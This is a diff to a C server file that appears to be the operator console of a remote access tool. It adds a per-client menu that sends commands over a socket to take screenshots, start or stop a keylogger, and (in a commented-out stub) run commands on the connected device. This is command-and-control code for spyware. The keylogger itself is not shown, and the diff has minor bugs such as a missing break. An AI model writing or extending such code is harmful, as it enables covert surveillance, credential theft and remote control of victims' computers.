@@ -1,5 +1,7 @@
 #include "serverInterface.h"
 #include "constraints.h"
+#include "messageManager.h"
+#include  "utils.h"
 #include "serverManager.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -59,14 +61,45 @@ void *userManagement(int clientNr)
 {
     char numeDevice[30];
     strcpy(numeDevice, clientHndler.clientsAttr[clientHndler.socketsClients[clientNr]].name);
+    int clientSock = clientHndler.socketsClients[clientNr];
+    int exit=0;
+    message_t scr_msg;
+    char BUF[SEND_BUFFER_SIZE];
     while (1)
     {
         system("clear");
         printf("\tClient: %s\n", numeDevice);
-        printf("\t\texit");
+        printf("\t\t->  take screenshot; press s\n");
+        printf("\t\t->  stop/start keylog; press k\n");
+        printf("\t\t->  enter cmd; press c\n");
+        printf("\t\texit press q\n");
         char ch = getchar();
-        if (ch == 'q')
+        switch (ch)
+        {
+        case 'q':
+            exit=1;
             break;
+        case 's':
+            strcpy(BUF, "");
+            encapsulateMessage(&scr_msg, BUF, 'S');
+            sendMessage(clientSock, &scr_msg);
+            break;
+        case 'k':
+            strcpy(BUF, "");
+            encapsulateMessage(&scr_msg, BUF, 'K');
+            sendMessage(clientSock, &scr_msg);
+        // case 'c':
+        //     message_t scr_msg;
+        //     encapsulateMessage(&scr_msg, "", '');
+        //     sendMessage(clientSock, scr_msg);
+        default:
+            break;
+        }
+
+
+        if (exit==1)
+            break;
+        system("clear");
     }
 }
 
